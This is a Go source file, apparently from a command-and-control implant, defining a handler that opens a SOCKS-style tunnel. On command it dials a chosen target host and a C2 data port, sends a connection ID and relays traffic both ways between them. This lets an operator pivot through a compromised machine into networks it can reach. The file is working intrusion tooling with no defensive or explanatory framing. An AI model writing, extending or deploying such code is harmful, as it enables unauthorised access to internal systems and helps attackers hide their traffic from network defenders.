package main

import (
	"fmt"
	"io"
	"net"
	"strconv"
	"time"
)

// handleSocksConnect: dial target, dial C2 data port, announce conn_id, bridge.
func handleSocksConnect(args map[string]any) string {
	connID, _ := args["conn_id"].(string)
	host, _ := args["host"].(string)
	dataHost, _ := args["data_host"].(string)
	port := anyToInt(args["port"])
	dataPort := anyToInt(args["data_port"])
	if connID == "" || host == "" || dataHost == "" || port <= 0 || dataPort <= 0 {
		return "error: socks:connect missing args"
	}
	target := net.JoinHostPort(host, strconv.Itoa(port))
	tconn, err := net.DialTimeout("tcp", target, 20*time.Second)
	if err != nil {
		return "error: target dial: " + err.Error()
	}
	defer tconn.Close()

	daddr := net.JoinHostPort(dataHost, strconv.Itoa(dataPort))
	dconn, err := net.DialTimeout("tcp", daddr, 20*time.Second)
	if err != nil {
		return "error: data dial: " + err.Error()
	}
	defer dconn.Close()

	if _, err := fmt.Fprintf(dconn, "%s\n", connID); err != nil {
		return "error: announce: " + err.Error()
	}

	errc := make(chan error, 2)
	go func() { _, e := io.Copy(tconn, dconn); errc <- e }()
	go func() { _, e := io.Copy(dconn, tconn); errc <- e }()
	<-errc
	return "socks:bridged"
}

func anyToInt(v any) int {
	switch t := v.(type) {
	case float64:
		return int(t)
	case int:
		return t
	case int64:
		return int(t)
	case string:
		n, _ := strconv.Atoi(t)
		return n
	default:
		return 0
	}
}
